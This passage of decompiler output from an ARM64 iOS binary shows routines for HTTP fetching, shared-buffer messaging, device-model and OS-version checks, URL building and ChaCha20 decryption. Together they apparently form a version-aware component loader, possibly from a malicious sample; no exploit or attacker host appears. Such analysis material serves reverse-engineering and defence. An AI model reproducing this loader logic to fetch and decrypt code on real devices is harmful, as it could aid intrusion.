          *(_DWORD *)(a3 + 12) = CFHTTPMessageGetResponseStatusCode(v5);
          CFRelease(v6);
        }
        break;
    }
    goto LABEL_15;
  }
  if ( (unsigned __int64)a2 >= 2 )
  {
    if ( a2 != 2
      || (v4 = CFReadStreamRead(a1, v8, 4096), v4 > 0) && !CFHTTPMessageAppendBytes(*(CFHTTPMessageRef *)a3, v8, v4) )
    {
LABEL_15:
      Current = CFRunLoopGetCurrent();
      CFRunLoopStop(Current);
    }
  }
}


////////////////////////////////////////////////////////////////////////
// Function: sub_987C
// Address:  0x987C  Size: 440 bytes
// Calls:    _semaphore_wait, _thread_switch, _strncpy, _semaphore_signal, sub_B0FC, _malloc, _memcpy
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_987C(__int64 a1, const char *a2, const char *a3, __int64 a4, _QWORD *a5, _DWORD *a6)
{
  __int64 v6; // x20
  __int64 v13; // x26
  __int64 v14; // x8
  __int64 v15; // x8
  int v16; // w9
  int *v17; // x25
  int v18; // w8
  size_t v20; // x23
  void *v21; // x0
  void *v22; // x24

  v6 = 708609;
  if ( a5 && a6 )
  {
    *a5 = 0;
    *a6 = 0;
    if ( semaphore_wait(*(_DWORD *)(a1 + 1528)) )
      return 12309;
    if ( a4 )
    {
      v13 = a4;
      while ( 1 )
      {
        v14 = *(_QWORD *)(a1 + 1504);
        if ( !*(_DWORD *)v14 )
          break;
        if ( *(_DWORD *)v14 != 5 )
        {
          thread_switch(0, 2, 1u);
          if ( --v13 )
            continue;
        }
        goto LABEL_15;
      }
      strncpy((char *)(v14 + 4), a2, 0x7FFFFCu);
      *(_BYTE *)(*(_QWORD *)(a1 + 1504) + 0x7FFFFFLL) = 0;
      v15 = *(_QWORD *)(a1 + 1504);
      if ( a3 )
      {
        strncpy((char *)(v15 + 0x800000), a3, 0x800000u);
        *(_BYTE *)(*(_QWORD *)(a1 + 1504) + 0xFFFFFFLL) = 0;
        v15 = *(_QWORD *)(a1 + 1504);
        v16 = 7;
      }
      else
      {
        v16 = 1;
      }
      *(_DWORD *)v15 = v16;
LABEL_15:
      while ( 1 )
      {
        v17 = *(int **)(a1 + 1504);
        v18 = *v17;
        if ( (unsigned int)(*v17 - 3) < 2 )
          break;
        thread_switch(0, 2, 1u);
        if ( !--a4 )
          goto LABEL_17;
      }
      *v17 = 0;
      if ( v18 == 3 )
      {
        v20 = (unsigned int)v17[1];
        if ( (_DWORD)v20 )
        {
          v21 = malloc((unsigned int)v17[1]);
          if ( v21 )
          {
            v22 = v21;
            memcpy(v21, v17 + 2, v20);
            v6 = 0;
            *a5 = v22;
            *a6 = v20;
          }
          else
          {
            v6 = 708617;
          }
        }
        else
        {
          v6 = 12306;
        }
        goto LABEL_19;
      }
    }
    else
    {
LABEL_17:
      **(_DWORD **)(a1 + 1504) = 0;
    }
    v6 = 12309;
LABEL_19:
    semaphore_signal(*(_DWORD *)(a1 + 1528));
  }
  return v6;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9A34
// Address:  0x9A34  Size: 300 bytes
// Calls:    _vsnprintf, _malloc, _bzero, _free, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_9A34(char **a1, _DWORD *a2, char *__format, int a4, int a5, int a6, int a7, int a8, char a9)
{
  __int64 v9; // x19
  int v13; // w0
  int v14; // w24
  size_t v15; // x25
  char *v16; // x0
  char *v17; // x22

  v9 = 708609;
  if ( a1 && a2 && __format )
  {
    v13 = vsnprintf(0, 0, __format, &a9);
    if ( v13 < 1 )
    {
      v17 = 0;
      LODWORD(v16) = 0;
      v9 = 708628;
    }
    else
    {
      v14 = v13;
      v15 = (unsigned int)(v13 + 1);
      v16 = (char *)malloc(v15);
      v17 = v16;
      if ( v16 )
      {
        LODWORD(v16) = vsnprintf(v16, v15, __format, &a9);
        if ( (int)v16 <= v14 )
        {
          v9 = 0;
          v17[v14] = 0;
        }
        else
        {
          bzero(v17, v15);
          free(v17);
          v17 = 0;
          LODWORD(v16) = 0;
          v9 = 708619;
        }
      }
      else
      {
        v9 = 708617;
      }
    }
    *a1 = v17;
    *a2 = (_DWORD)v16;
  }
  return v9;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9B60
// Address:  0x9B60  Size: 344 bytes
// Calls:    _sysctlbyname, sub_B0FC
// Xrefs:    5 callers
// Strings:  "hw.model"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_9B60(__int64 result)
{
  __int64 v1; // x19
  unsigned int v2; // w8
  int v3; // w8
  int v4; // w9
  size_t v5; // [xsp+8h] [xbp-38h] BYREF
  _BYTE v6[32]; // [xsp+10h] [xbp-30h] BYREF

  if ( result )
  {
    v1 = result;
    v2 = *(_DWORD *)(result + 192);
    if ( v2 > 0x1006FF )
      return 1;
    if ( v2 <= 0x100400 )
    {
      if ( v2 - 984839 < 0xF8F9 )
        return 1;
      if ( (v2 - 983552) >> 9 <= 0x7E )
      {
        memset(v6, 0, sizeof(v6));
        v5 = 32;
        if ( !sysctlbyname("hw.model", v6, &v5, 0, 0) && (v6[0] & 0xDF) == 0x4A )
          return (unsigned __int64)(*(_QWORD *)(v1 + 1600) - 1073741825LL) >> 30 == 0;
      }
    }
    else
    {
      v3 = *(_DWORD *)(result + 224);
      result = 1;
      if ( v3 > 458787762 )
      {
        if ( v3 != 458787763 )
        {
          v4 = 1176831186;
LABEL_15:
          if ( v3 != v4 )
            return result;
        }
      }
      else if ( v3 != -2023363094 )
      {
        v4 = -634136515;
        goto LABEL_15;
      }
    }
    return 0;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9CB8
// Address:  0x9CB8  Size: 608 bytes
// Calls:    sub_AB8C, _bzero, _uname, sub_9F18, sub_B0FC
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_9CB8(__int64 a1, char *a2, int a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 result; // x0
  int v10; // w21
  int v11; // w20
  int v12; // w19
  int v13; // w7
  int v14; // w25
  unsigned int v15; // w27
  unsigned int v16; // w28
  int v17; // w10
  unsigned int v18; // w8
  unsigned int v19; // w0
  int v20; // w7
  int v21; // w8
  unsigned int v22; // w8
  unsigned int v23; // w9
  int v24; // w11
  int v25; // w10
  bool v26; // cf
  int v27; // w9
  int v28; // w10
  int v29; // w11
  __int64 v30; // [xsp+0h] [xbp-560h]
  __int64 v31; // [xsp+0h] [xbp-560h]
  utsname v32; // [xsp+8h] [xbp-558h] BYREF

  result = 708609;
  if ( !a1 )
    return result;
  if ( !a2 )
    return result;
  if ( !a3 )
    return result;
  v10 = a4;
  if ( !a4 )
    return result;
  v11 = a5;
  if ( !a5 )
    return result;
  v12 = a6;
  if ( !a6 )
    return result;
  v14 = sub_AB8C(a1);
  if ( !v14 )
  {
    v18 = 0;
    goto LABEL_21;
  }
  v15 = *(_DWORD *)(a1 + 220);
  v16 = *(_DWORD *)(a1 + 192);
  if ( v16 > 0xF05FF )
    goto LABEL_18;
  if ( v16 <= 0xEFFFF )
  {
    if ( v16 < 0xE0802 )
    {
      if ( v16 < 0xD0000 )
      {
        v18 = 0;
        v14 = 0;
      }
      else
      {
        v22 = (v16 >> 8) & 0xF00;
        v23 = (v16 >> 4) & 0xF0;
        if ( v23 >= 0x50 )
          v24 = 80;
        else
          v24 = 0;
        if ( v23 > 0x6F )
          v24 = 112;
        if ( (v16 & 0xF) != 0 )
          v25 = (v16 >> 4) & 0xF0;
        else
          v25 = 112;
        v26 = v23 >= 0x80;
        if ( v23 >= 0x80 )
          v27 = v25;
        else
          v27 = v24;
        if ( v26 )
          v28 = *(_DWORD *)(a1 + 192) & 0xF;
        else
          v28 = 0;
        if ( v22 < 0xE00 )
        {
          v27 = 0;
          v28 = 0;
        }
        if ( v15 <= 1 )
          v29 = 0x10000000;
        else
          v29 = 285212672;
        v18 = v22 | v29 | v27 | v28;
      }
      goto LABEL_21;
    }
    goto LABEL_18;
  }
  bzero(&v32, 0x500u);
  if ( uname(&v32) || *(_DWORD *)v32.machine ^ 0x6F685069 | *(unsigned __int16 *)&v32.machine[4] ^ 0x656E )
  {
LABEL_18:
    if ( v15 <= 1 )
      v18 = 0x2000000;
    else
      v18 = -503316480;
    goto LABEL_21;
  }
  if ( v15 <= 1 )
    v17 = 301989888;
  else
    v17 = 318767104;
  v18 = (v16 >> 8) & 0xF00 | v17 & 0xFFFFFFDF | (32 * ((v16 & 0xE00) != 0));
LABEL_21:
  result = sub_9F18(
             a1,
             v14 | v18,
             a2,
             a3,
             v10,
             v11,
             v12,
             v13,
             v30,
             *(__int64 *)v32.sysname,
             v32.sysname[8],
             *(__int64 *)&v32.sysname[16],
             *(__int64 *)&v32.sysname[24],
             *(__int64 *)&v32.sysname[32],
             *(__int128 *)&v32.sysname[40],
             *(__int64 *)&v32.sysname[56],
             *(__int64 *)&v32.sysname[64],
             *(__int128 *)&v32.sysname[72],
             *(__int64 *)&v32.sysname[88],
             *(__int64 *)&v32.sysname[96],
             *(__int128 *)&v32.sysname[104],
             *(__int64 *)&v32.sysname[120],
             *(__int64 *)&v32.sysname[128],
             *(__int128 *)&v32.sysname[136],
             *(__int64 *)&v32.sysname[152],
             *(__int64 *)&v32.sysname[160],
             *(__int128 *)&v32.sysname[168],
             *(__int64 *)&v32.sysname[184],
             *(__int64 *)&v32.sysname[192],
             *(__int128 *)&v32.sysname[200],
             *(__int64 *)&v32.sysname[216],
             *(__int64 *)&v32.sysname[224],
             *(__int128 *)&v32.sysname[232],
             *(__int64 *)&v32.sysname[248],
             *(__int64 *)v32.nodename,
             *(__int128 *)&v32.nodename[8],
             *(__int64 *)&v32.nodename[24],
             *(__int64 *)&v32.nodename[32],
             *(__int128 *)&v32.nodename[40],
             *(__int64 *)&v32.nodename[56],
             *(__int64 *)&v32.nodename[64],
             *(__int128 *)&v32.nodename[72],
             *(__int64 *)&v32.nodename[88],
             *(__int64 *)&v32.nodename[96],
             *(__int128 *)&v32.nodename[104],
             *(__int64 *)&v32.nodename[120],
             *(__int64 *)&v32.nodename[128],
             *(__int128 *)&v32.nodename[136],
             *(__int64 *)&v32.nodename[152],
             *(__int64 *)&v32.nodename[160],
             *(__int128 *)&v32.nodename[168],
             *(__int64 *)&v32.nodename[184],
             *(__int64 *)&v32.nodename[192],
             *(__int128 *)&v32.nodename[200],
             *(__int64 *)&v32.nodename[216],
             *(__int64 *)&v32.nodename[224],
             *(__int128 *)&v32.nodename[232]);
  if ( (_DWORD)result == 196609 )
  {
    v19 = sub_AB8C(a1);
    if ( v19 )
    {
      if ( (*(_BYTE *)(a1 + 219) & 1) != 0 )
      {
        if ( *(_DWORD *)(a1 + 220) <= 1u )
          v21 = 0x2000000;
        else
          v21 = -503316480;
      }
      else
      {
        v21 = 0x1000000;
      }
    }
    else
    {
      v21 = 0;
    }
    return sub_9F18(
             a1,
             v21 | v19,
             a2,
             a3,
             v10,
             v11,
             v12,
             v20,
             v31,
             *(__int64 *)v32.sysname,
             v32.sysname[8],
             *(__int64 *)&v32.sysname[16],
             *(__int64 *)&v32.sysname[24],
             *(__int64 *)&v32.sysname[32],
             *(__int128 *)&v32.sysname[40],
             *(__int64 *)&v32.sysname[56],
             *(__int64 *)&v32.sysname[64],
             *(__int128 *)&v32.sysname[72],
             *(__int64 *)&v32.sysname[88],
             *(__int64 *)&v32.sysname[96],
             *(__int128 *)&v32.sysname[104],
             *(__int64 *)&v32.sysname[120],
             *(__int64 *)&v32.sysname[128],
             *(__int128 *)&v32.sysname[136],
             *(__int64 *)&v32.sysname[152],
             *(__int64 *)&v32.sysname[160],
             *(__int128 *)&v32.sysname[168],
             *(__int64 *)&v32.sysname[184],
             *(__int64 *)&v32.sysname[192],
             *(__int128 *)&v32.sysname[200],
             *(__int64 *)&v32.sysname[216],
             *(__int64 *)&v32.sysname[224],
             *(__int128 *)&v32.sysname[232],
             *(__int64 *)&v32.sysname[248],
             *(__int64 *)v32.nodename,
             *(__int128 *)&v32.nodename[8],
             *(__int64 *)&v32.nodename[24],
             *(__int64 *)&v32.nodename[32],
             *(__int128 *)&v32.nodename[40],
             *(__int64 *)&v32.nodename[56],
             *(__int64 *)&v32.nodename[64],
             *(__int128 *)&v32.nodename[72],
             *(__int64 *)&v32.nodename[88],
             *(__int64 *)&v32.nodename[96],
             *(__int128 *)&v32.nodename[104],
             *(__int64 *)&v32.nodename[120],
             *(__int64 *)&v32.nodename[128],
             *(__int128 *)&v32.nodename[136],
             *(__int64 *)&v32.nodename[152],
             *(__int64 *)&v32.nodename[160],
             *(__int128 *)&v32.nodename[168],
             *(__int64 *)&v32.nodename[184],
             *(__int64 *)&v32.nodename[192],
             *(__int128 *)&v32.nodename[200],
             *(__int64 *)&v32.nodename[216],
             *(__int64 *)&v32.nodename[224],
             *(__int128 *)&v32.nodename[232]);
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_9F18
// Address:  0x9F18  Size: 892 bytes
// Calls:    sub_B0FC, _strlen, _snprintf, _strncmp, _strlcpy, _strchr, _strlcat
// Xrefs:    4 callers
// Strings:  "%s/%s", "%s%s", "https://", "http://"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_9F18(
        __int64 a1,
        int a2,
        char *__s,
        unsigned int a4,
        char *a5,
        size_t a6,
        _QWORD *a7,
        int a8,
        __int64 a9,
        __int64 a10,
        __int128 __str,
        __int128 a12,
        __int128 a13,
        __int128 a14,
        __int128 a15,
        __int128 a16,
        __int128 a17,
        __int128 a18,
        __int128 a19,
        __int128 a20,
        __int128 a21,
        __int128 a22,
        __int128 a23,
        __int128 a24,
        __int128 a25,
        __int128 a26,
        __int128 a27,
        __int128 a28,
        __int128 a29,
        __int128 a30,
        __int128 a31,
        __int128 a32,
        __int128 a33,
        __int128 a34,
        __int128 a35,
        __int128 a36,
        __int128 a37,
        __int128 a38,
        __int128 a39,
        __int128 a40,
        __int128 a41)
{
  __int64 v41; // x26
  unsigned __int16 v42; // w0
  __int64 result; // x0
  __int64 v48; // x8
  char *v49; // x9
  char *i; // x25
  const char *v51; // x2
  int v52; // w24
  const char *v53; // x22
  __int64 v54; // x23
  char *v55; // x0
  char *v56; // x23
  const char *v57; // x9
  __int128 *p_str; // x8
  size_t v59; // x0
  int v60; // w26
  const char *v61; // x24
  char *v62; // x0
  const char *v63; // x24
  int v64; // t1
  size_t v65; // x2

  v41 = 708609;
  if ( a1
    && __s
    && a4 >= 0x10C
    && *(_DWORD *)__s == 305419896
    && __s[8]
    && !__s[263]
    && *((_DWORD *)__s + 66)
    && a5
    && a6
    && a7 )
  {
    result = 196609;
    if ( a2 )
    {
      v48 = 0;
      v49 = &__s[a4];
      for ( i = __s + 268; ; i += 100 )
      {
        if ( v49 <= i || i + 100 < __s || v49 < i + 100 || i[99] )
        {
          v42 = -12268;
          return v42 | 0xA0000u;
        }
        if ( *(_DWORD *)i == a2 )
          break;
        if ( ++v48 >= (unsigned __int64)*((unsigned int *)__s + 66) )
          return result;
      }
      a41 = 0u;
      *(_OWORD *)&STACK[0x470] = 0u;
      a39 = 0u;
      a40 = 0u;
      a37 = 0u;
      a38 = 0u;
      a35 = 0u;
      a36 = 0u;
      a33 = 0u;
      a34 = 0u;
      a31 = 0u;
      a32 = 0u;
      a29 = 0u;
      a30 = 0u;
      a27 = 0u;
      a28 = 0u;
      a25 = 0u;
      a26 = 0u;
      a23 = 0u;
      a24 = 0u;
      a21 = 0u;
      a22 = 0u;
      a19 = 0u;
      a20 = 0u;
      a17 = 0u;
      a18 = 0u;
      a15 = 0u;
      a16 = 0u;
      a13 = 0u;
      a14 = 0u;
      __str = 0u;
      a12 = 0u;
      if ( __s[strlen(__s + 8) + 7] == 47 )
        v51 = "%s%s";
      else
        v51 = "%s/%s";
      if ( snprintf((char *)&__str, 0x200u, v51) > 511 )
        return 708620;
      v52 = (unsigned __int8)__str;
      if ( !(_BYTE)__str )
        return v41;
      if ( !((unsigned int)__str ^ 0x70747468 | *(_DWORD *)((char *)&__str + 3) ^ 0x2F2F3A70)
        || (_QWORD)__str == 0x2F2F3A7370747468LL )
      {
        strlcpy(a5, (const char *)&__str, a6);
LABEL_38:
        v41 = 0;
        *a7 = i + 4;
        return v41;
      }
      v53 = *(const char **)(a1 + 128);
      if ( !v53 || !*v53 )
        return 196611;
      v54 = 8;
      if ( strncmp(v53, "https://", 8u) )
      {
        v54 = 7;
        if ( strncmp(v53, "http://", 7u) )
          return 196612;
      }
      v55 = strchr(&v53[v54], 47);
      v56 = v55;
      if ( v55 )
      {
        v57 = v55 + 1;
        if ( v52 == 47 )
        {
          p_str = &__str;
          v59 = v57 - v53;
LABEL_50:
          v63 = (char *)p_str - 1;
          do
            v64 = *(unsigned __int8 *)++v63;
          while ( v64 == 47 );
          if ( v59 + 1 <= a6 )
            v65 = v59 + 1;
          else
            v65 = a6;
          strlcpy(a5, v53, v65);
          if ( !v56 )
            strlcat(a5, "/", a6);
          strlcat(a5, v63, a6);
          goto LABEL_38;
        }
        v60 = v52;
        do
        {
          v61 = v57;
          v62 = strchr(v57, 47);
          v57 = v62 + 1;
        }
        while ( v62 );
        v59 = v61 - v53;
      }
      else
      {
        v60 = v52;
        v59 = strlen(v53);
      }
      p_str = &__str;
      if ( v60 == 46 )
        p_str = (__int128 *)((unsigned __int64)&__str & 0xFFFFFFFFFFFFFFFDLL | (2LL * (BYTE1(__str) == 47)));
      goto LABEL_50;
    }
  }
  else
  {
    v42 = -12287;
    return v42 | 0xA0000u;
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_A294  [ASM — decompile() returned None]
// Address:  0xA294  Size: 388 bytes
// Calls:    sub_9B60, sub_AB8C, sub_9F18, sub_B0FC
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

  0xA294:  STP             X26, X25, [SP,#-0x10+var_40]!; __int64    ; __int64
  0xA298:  STP             X24, X23, [SP,#0x40+__str]; __str    ; __str
  0xA29C:  STP             X22, X21, [SP,#0x40+var_20]; __int64    ; __int64
  0xA2A0:  STP             X20, X19, [SP,#0x40+var_10]; __int128    ; __int128
  0xA2A4:  STP             X29, X30, [SP,#0x40+var_s0]; __int64    ; __int64
  0xA2A8:  ADD             X29, SP, #0x40
  0xA2AC:  MOV             X24, X0
  0xA2B0:  MOV             W0, #0xAD001
  0xA2B8:  CBZ             X24, loc_A3DC
  0xA2BC:  MOV             X23, X1
  0xA2C0:  CBZ             X1, loc_A3DC
  0xA2C4:  MOV             X22, X2
  0xA2C8:  CBZ             W2, loc_A3DC
  0xA2CC:  MOV             X21, X3
  0xA2D0:  CBZ             X3, loc_A3DC
  0xA2D4:  MOV             X20, X4
  0xA2D8:  CBZ             X4, loc_A3DC
  0xA2DC:  MOV             X19, X5
  0xA2E0:  CBZ             X5, loc_A3DC
  0xA2E4:  LDRB            W8, [X24,#0x5E8]
  0xA2E8:  CBZ             W8, loc_A2F8
  0xA2EC:  MOV             X0, X24
  0xA2F0:  BL              sub_9B60
  0xA2F4:  TBZ             W0, #0, loc_A300
  0xA2F8:  MOV             W25, #0
  0xA2FC:  B               loc_A380
  0xA300:  LDR             W8, [X24,#0xC0]
  0xA304:  MOV             W9, #0xFFEFFC00
  0xA30C:  ADD             W9, W8, W9
  0xA310:  LSR             W9, W9, #0xA
  0xA314:  CMP             W9, #0x3E ; '>'
  0xA318:  B.HI            loc_A370
  0xA31C:  LDR             W9, [X24,#0xE0]
  0xA320:  MOV             W25, #0x30000
  0xA324:  MOV             W10, #0x1B588BB2
  0xA32C:  CMP             W9, W10
  0xA330:  B.GT            loc_A350
  0xA334:  MOV             W10, #0x8765EDEA
  0xA33C:  CMP             W9, W10
  0xA340:  B.EQ            loc_A380
  0xA344:  MOV             W10, #0xDA33D83D
  0xA34C:  B               loc_A368
  0xA350:  MOV             W10, #0x1B588BB3
  0xA358:  CMP             W9, W10
  0xA35C:  B.EQ            loc_A380
  0xA360:  MOV             W10, #0x462504D2
  0xA368:  CMP             W9, W10
  0xA36C:  B.EQ            loc_A380
  0xA370:  SUB             W8, W8, #0x100,LSL#12
  0xA374:  CMP             W8, #0x401
  0xA378:  MOV             W8, #0x50000
  0xA37C:  CSEL            W25, W8, WZR, CC
  0xA380:  MOV             X0, X24
  0xA384:  BL              sub_AB8C
  0xA388:  CBZ             W0, loc_A39C
  0xA38C:  LDRB            W8, [X24,#0xDB]
  0xA390:  TBNZ            W8, #0, loc_A3A4
  0xA394:  MOV             W8, #0xF1000000
  0xA398:  B               loc_A3B8
  0xA39C:  MOV             W8, #0
  0xA3A0:  B               loc_A3B8
  0xA3A4:  LDR             W8, [X24,#0xDC]
  0xA3A8:  CMP             W8, #1
  0xA3AC:  MOV             W8, #0xF2000000
  0xA3B0:  MOV             W9, #0xF3000000
  0xA3B4:  CSEL            W8, W9, W8, HI
  0xA3B8:  ORR             W9, W0, W25
  0xA3BC:  ORR             W1, W9, W8; int    ; int
  0xA3C0:  MOV             X0, X24; int    ; int
  0xA3C4:  MOV             X2, X23; __s    ; __s
  0xA3C8:  MOV             X3, X22; int    ; int
  0xA3CC:  MOV             X4, X21; int    ; int
  0xA3D0:  MOV             X5, X20; int    ; int
  0xA3D4:  MOV             X6, X19; int    ; int
  0xA3D8:  BL              sub_9F18
  0xA3DC:  LDP             X29, X30, [SP,#0x40+var_s0]
  0xA3E0:  LDP             X20, X19, [SP,#0x40+var_10]
  0xA3E4:  LDP             X22, X21, [SP,#0x40+var_20]
  0xA3E8:  LDP             X24, X23, [SP,#0x40+__str]
  0xA3EC:  LDP             X26, X25, [SP+0x40+var_40],#0x50
  0xA3F0:  MOV             X10, X30
  0xA3F4:  MOV             X30, #0xAAAAAAAAAAAAAAAA
  0xA3F8:  XPACLRI
  0xA3FC:  MOV             X11, #0xAAAAAAAAAAAAAAAA
  0xA400:  CMP             X11, X30
  0xA404:  MOV             X30, X10
  0xA408:  B.NE            loc_A410
  0xA40C:  RET
  0xA410:  MOV             X10, X30
  0xA414:  BL              sub_B0FC


////////////////////////////////////////////////////////////////////////
// Function: sub_A418
// Address:  0xA418  Size: 1908 bytes
// Calls:    sub_B0FC, sub_9B60, sub_A294, sub_AC44, sub_9CB8, _strdup, _strlen, _bzero, _free, sub_9F18
// Xrefs:    2 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_A418(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // x24
  bool v5; // zf
  bool v6; // zf
  __int64 v8; // x25
  __int64 v10; // [xsp+8h] [xbp-298h] BYREF

  v4 = 708609;
  if ( a1 )
  {
    v5 = !*(_QWORD *)(a1 + 272) || (_DWORD)a2 == 0;
    v6 = v5 || a3 == 0;
    if ( !v6 && a4 != 0 )
    {
      v10 = 0;
      v8 = sub_B0FC(a1, a2, &v10);
      if ( !(_DWORD)v8 )
        return 708609;
      return v8;
    }
  }
  return v4;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_AB8C
// Address:  0xAB8C  Size: 184 bytes
// Calls:    sub_9B60, sub_B0FC
// Xrefs:    3 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_AB8C(__int64 result)
{
  __int64 v1; // x19
  unsigned int v2; // w8
  unsigned int v3; // w11

  if ( result )
  {
    v1 = result;
    if ( (sub_9B60(result) & 1) != 0 )
    {
      return 9437184;
    }
    else
    {
      v2 = *(_DWORD *)(v1 + 192);
      if ( v2 <= 0x100500 )
      {
        if ( v2 >> 20 )
        {
          return 7340032;
        }
        else
        {
          if ( v2 <= 0xDFFFF )
            v3 = 3145728;
          else
            v3 = 0x400000;
          if ( v2 > 0xE04FF )
            v3 = 7340032;
          if ( v2 <= 0xF0706 )
            return v3;
          else
            return 0x800000;
        }
      }
      else
      {
        return 0x800000;
      }
    }
  }
  return result;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_AC44
// Address:  0xAC44  Size: 328 bytes
// Calls:    sub_B0FC, sub_AD8C, sub_8430, _bzero, _free
// Xrefs:    4 callers
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_AC44(
        __int64 a1,
        _BYTE *a2,
        char a3,
        __int64 a4,
        _QWORD *a5,
        _DWORD *a6,
        __int64 a7,
        __int64 a8,
        int a9,
        int a10,
        __int64 a11)
{
  __int64 v11; // x21
  bool v16; // zf
  bool v17; // zf
  __int64 v20; // x0
  _DWORD v22[3]; // [xsp+4h] [xbp-3Ch] BYREF

  v11 = 708609;
  if ( a1 )
  {
    if ( *(_QWORD *)(a1 + 64) && a2 != 0 )
    {
      v16 = !*a2 || a4 == 0;
      v17 = v16 || a5 == 0;
      if ( !v17 && a6 != 0 )
      {
        memset(v22, 0, sizeof(v22));
        v20 = sub_B0FC(a1, a2, &v22[1]);
        if ( !(_DWORD)v20 )
        {
          if ( (a3 & 1) != 0
            || (a3 & 2) != 0 && (v11 = sub_8430((uint8_t **)&v22[1], v22), (_DWORD)v11)
            || (v20 = sub_B0FC(a1, 0, *(_QWORD *)&v22[1]), v11 = v20, (_DWORD)v20) )
          {
            bzero(*(void **)&v22[1], v22[0]);
            free(*(void **)&v22[1]);
            return v11;
          }
          else
          {
            *a5 = a11;
            *a6 = a10;
          }
        }
        return v20;
      }
    }
  }
  return v11;
}


////////////////////////////////////////////////////////////////////////
// Function: sub_AD8C
// Address:  0xAD8C  Size: 796 bytes
// Calls:    sub_B0FC
// Xrefs:    2 callers
// Strings:  "expand 32-byte k"
////////////////////////////////////////////////////////////////////////

__int64 __fastcall sub_AD8C(__int64 result, __int64 a2, __int64 a3)
{
  __int64 v3; // x8
  unsigned __int64 v4; // x13
  unsigned int v5; // w16
  unsigned int v6; // w23
  int v7; // w14
  int v8; // w15
  unsigned int v9; // w7
  unsigned int v10; // w19
  unsigned int v11; // w20
  unsigned int v12; // w22
  unsigned int v13; // w3
  unsigned int v14; // w5
  int v15; // w4
  int v16; // w6
  unsigned int v17; // w13
  unsigned int v18; // w21
  int v19; // w12
  unsigned int v20; // w17
  int v21; // w14
  int v22; // w7
  unsigned __int64 v23; // t2
  int v24; // w20
  int v25; // w23
  int v26; // w14
  int v27; // w7
  int v28; // w20
  int v29; // w23
  int v30; // w24
  int v31; // w15
  int v32; // w19
  int v33; // w22
  int v34; // w16
  int v35; // w15
  int v36; // w19
  int v37; // w22
  int v38; // w16
  int v39; // w25
  int v40; // w4
  int v41; // w21
  int v42; // w17
  int v43; // w3
  int v44; // w4
  int v45; // w21
  int v46; // w17
  int v47; // w3
  int v48; // w26
  int v49; // w6
  int v50; // w13
  int v51; // w0
  int v52; // w5
  int v53; // w6
  int v54; // w13
  int v55; // w0
  int v56; // w5
  int v57; // w27
  int v58; // w14
  int v59; // w13
  int v60; // w17
  int v61; // w16
  int v62; // w15
  int v63; // w7
  int v64; // w0
  int v65; // w3
  int v66; // w4
  int v67; // w19
  int v68; // w20
  int v69; // w5
  int v70; // w6
  int v71; // w21
  int v72; // w22
  int v73; // w23
  __int64 v74; // x24
  int v75; // w12
  bool v76; // cf
  __int64 v77; // [xsp+8h] [xbp-D8h]
  __int128 v78; // [xsp+10h] [xbp-D0h]
  __int128 v79; // [xsp+20h] [xbp-C0h]
  __int128 v80; // [xsp+30h] [xbp-B0h]
  __int128 v81; // [xsp+40h] [xbp-A0h]
  __int128 v82; // [xsp+50h] [xbp-90h]
  _BYTE v83[32]; // [xsp+60h] [xbp-80h]
  __int128 v84; // [xsp+80h] [xbp-60h]

  if ( a2 && a3 && result )
  {
    v3 = 0;
    v80 = 0u;
    v81 = 0u;
    v78 = 0u;
    v79 = 0u;
    *(_DWORD *)v83 = *(_DWORD *)result;
    *(_QWORD *)&v83[20] = *(_QWORD *)(result + 20);
    v82 = xmmword_BB80;
    *(_OWORD *)&v83[4] = *(_OWORD *)(result + 4);
    *(_DWORD *)&v83[28] = *(_DWORD *)(result + 28);
    v84 = 0u;
    v4 = 64;
    v77 = 64;
    do
    {
      if ( v4 <= 0x3F )
      {
        LOBYTE(v75) = *((_BYTE *)&v78 + v4);
      }
      else
      {
        v80 = *(_OWORD *)&v83[16];
        v81 = v84;
        v78 = v82;
        v79 = *(_OWORD *)v83;
        v6 = *(_DWORD *)v83;
        v5 = *(_DWORD *)&v83[4];
        v7 = v82;
        v8 = DWORD1(v82);
        v9 = v84;
        v10 = DWORD1(v84);
        v11 = *(_DWORD *)&v83[16];
        v12 = *(_DWORD *)&v83[20];
        v13 = *(_DWORD *)&v83[8];
        v14 = *(_DWORD *)&v83[12];
        v15 = DWORD2(v82);
        v16 = HIDWORD(v82);
        v18 = DWORD2(v84);
        v17 = HIDWORD(v84);
        v19 = 10;
        v20 = *(_DWORD *)&v83[24];
        LODWORD(result) = *(_DWORD *)&v83[28];
        do
        {
          v21 = v7 + v6;
          v22 = v9 ^ v21;
          HIDWORD(v23) = v22;
          LODWORD(v23) = v22;
          v24 = (v23 >> 16) + v11;
          v25 = v24 ^ v6;
          HIDWORD(v23) = v25;
          LODWORD(v23) = v25;
          v26 = (v23 >> 20) + v21;
          LODWORD(v23) = v26 ^ __ROR4__(v22, 16);
          v27 = v23;
          HIDWORD(v23) = v23;
          v28 = (v23 >> 24) + v24;
          LODWORD(v23) = v28 ^ __ROR4__(v25, 20);
          v29 = v23;
          HIDWORD(v23) = v23;
          v30 = v23 >> 25;
          v31 = v8 + v5;
          v32 = v10 ^ v31;
          HIDWORD(v23) = v32;
          LODWORD(v23) = v32;
          v33 = (v23 >> 16) + v12;
          v34 = v33 ^ v5;
          HIDWORD(v23) = v34;
          LODWORD(v23) = v34;
          v35 = (v23 >> 20) + v31;
          LODWORD(v23) = v35 ^ __ROR4__(v32, 16);
          v36 = v23;
          HIDWORD(v23) = v23;
          v37 = (v23 >> 24) + v33;
